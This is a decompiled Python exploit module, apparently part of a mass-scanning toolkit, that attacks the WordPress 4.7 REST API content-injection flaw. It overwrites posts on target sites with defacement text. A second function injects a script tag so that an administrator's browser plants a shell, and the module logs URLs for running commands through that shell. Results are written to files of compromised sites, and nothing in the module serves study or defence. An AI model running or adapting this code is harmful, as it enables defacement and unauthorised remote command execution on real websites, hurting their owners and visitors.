# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\wp_content_injection.py
import json
import requests
import re
from Exploits import printModule
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
   }

def GetWordpressPostId(zzz):
    try:
        PostId = requests.get('http://' + zzz + '/wp-json/wp/v2/posts/', timeout=5, headers=Headers)
        wsx = re.findall('"id":(.+?),"date"', PostId.content)
        postid = wsx[1].strip()
        return postid
    except:
        pass


def Exploit(site):
    try:
        zaq = GetWordpressPostId(site)
        headers = {'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
           }
        xxx = str(zaq) + 'bbx'
        data = json.dumps({'content': '<h1>Vuln!! Path it now!!\n<p><title>Vuln!! Path it now!!<br />\n</title></p></h1>\n',
           'title': 'Vuln!! Path it now!!',
           'id': xxx,
           'link': '/x-htm/',
           'slug': '"/x-htm/"'
           })
        GoT = requests.post('http://' + site + '/wp-json/wp/v2/posts/' + str(zaq), data=data, headers=headers, timeout=10)
        if GoT:
            CheckIndex = 'http://' + site + '/x.htm'
            zcheck = requests.get(CheckIndex, timeout=10, headers=Headers)
            if 'Vuln!!' in zcheck.content:
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/x.htm' + '\n')
                return printModule.returnYes(site, 'N/A', 'Wordpress 4.7 Content Injection', 'Wordpress')
            else:
                return printModule.returnNo(site, 'N/A', 'Wordpress 4.7 Content Injection', 'Wordpress')

        else:
            return printModule.returnNo(site, 'N/A', 'Wordpress 4.7 Content Injection', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'Wordpress 4.7 Content Injection', 'Wordpress')


def wp_contentShellInject(site):
    try:
        zaq = GetWordpressPostId(site)
        headers = {'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
           }
        xxx = str(zaq) + 'bbx'
        data = json.dumps({'content': "Vuln!!shell<script src='/sh.js'></script>",
           'title': 'Click Here Vuln!!',
           'id': xxx,
           'link': '/sh-htm/',
           'slug': '"/sh-htm/"'
           })
        GoT = requests.post('http://' + site + '/wp-json/wp/v2/posts/' + str(zaq), data=data, headers=headers, timeout=10)
        if GoT:
            CheckIndex = 'http://' + site + '/sh.htm'
            zcheck = requests.get(CheckIndex, timeout=10, headers=Headers)
            if 'Vuln!!' in zcheck.content:
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/wp-content/plugins/akismet/index.php?cmd=id --> After js execution in admin panel, you will have shell access ' + '\n')
    except:
        pass